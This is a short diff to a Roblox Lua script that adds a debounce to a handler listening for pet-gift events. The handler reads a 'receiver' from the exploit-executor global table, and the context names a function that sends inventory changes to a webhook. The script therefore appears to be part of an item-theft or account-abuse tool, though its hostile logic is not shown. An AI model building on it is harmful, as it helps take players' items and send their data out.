@@ -141,9 +141,15 @@ local function sendWebhook(oldInv, newInv, displayName)
 	end
 end
 
--- 👂 Listen for gift acceptance
+-- 👂 Listen for gift acceptance with debounce
+local debounceTime = 2
+local lastUpdate = 0
 local connection
+
 connection = RefreshActivePetsUI.OnClientEvent:Connect(function()
+	if tick() - lastUpdate < debounceTime then return end
+	lastUpdate = tick()
+
 	local raw = getgenv().receiever
 	local receiver = typeof(raw) == "Instance" and raw or Players:FindFirstChild(raw or "")
 	if receiver then
